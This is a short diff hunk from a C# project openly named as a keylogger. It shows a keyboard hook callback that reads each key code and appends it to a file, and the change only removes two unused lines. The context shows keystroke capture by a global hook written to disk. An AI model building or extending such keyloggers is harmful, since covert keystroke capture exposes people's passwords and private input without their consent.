@@ -64,8 +64,7 @@ namespace WFormMyKeyLogger
             if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                var keyName = Enum.GetName(typeof(Keys), vkCode);
-                KeysConverter keysConverter = new KeysConverter();
+                                
                 using (StreamWriter sw = new StreamWriter(notepadPath, true))
                 {
                     KeysConverter kc = new KeysConverter();
